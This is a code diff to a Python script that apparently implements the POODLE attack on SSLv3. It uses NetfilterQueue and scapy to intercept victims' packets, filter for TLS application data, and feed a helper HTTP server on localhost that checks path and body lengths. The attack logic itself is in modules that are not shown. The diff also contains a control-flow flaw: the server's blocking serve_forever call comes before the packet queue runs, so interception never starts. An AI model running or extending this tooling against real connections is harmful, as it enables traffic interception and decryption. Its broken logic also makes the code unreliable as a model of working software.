@@ -1,4 +1,5 @@
 from netfilterqueue import NetfilterQueue
+import http.server
 from scapy.all import *
 from scapy.layers.tls.all import TLS
 from scapy.layers.http import *
@@ -10,6 +11,7 @@ from utils.modify_and_send_packet import modify_and_send_packet
 from utils.is_sslv3_packet import is_sslv3_packet
 from utils.get_field import get_field
 from scapy.layers.inet import IP, TCP
+from handler.CheckPathLengthAndBodyLengthEndpointHandler import CheckPathLengthAndBodyLengthEndpointHandler
 
 config = json.load(open('config.json'))
 
@@ -24,6 +26,7 @@ def attack_callback(packet):
         packet.accept()
         return
 
+
     if not is_sslv3_packet(pkt):
         packet.accept()
         return
@@ -32,13 +35,14 @@ def attack_callback(packet):
     if pkt.src == config['client']:
         packet.accept()
         return
-    print(get_field(pkt.getlayer(TLS),'type') == "application_data")
-
-
 
     victim = POODLEAttack()
 
-    print(get_field(pkt.getlayer(TLS),'type') == "application_data")
+    packet_type = get_field(pkt.getlayer(TLS),'type')
+
+    if packet_type != "application_data":
+        packet.accept()
+        return
 
 
 
@@ -71,14 +75,23 @@ class POODLEAttack:
 
 
 
+class Test:
+    def __init__(self):
+        self.pathLength = "3"
+        self.postLength = "3"
 
 
+
+server = http.server.HTTPServer(("localhost",8090),CheckPathLengthAndBodyLengthEndpointHandler)
+server.victim = Test()
 
 try:
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, attack_callback)
+    server.serve_forever()
     nfqueue.run()
 except KeyboardInterrupt:
     pass
 
 nfqueue.unbind()
+server.server_close()
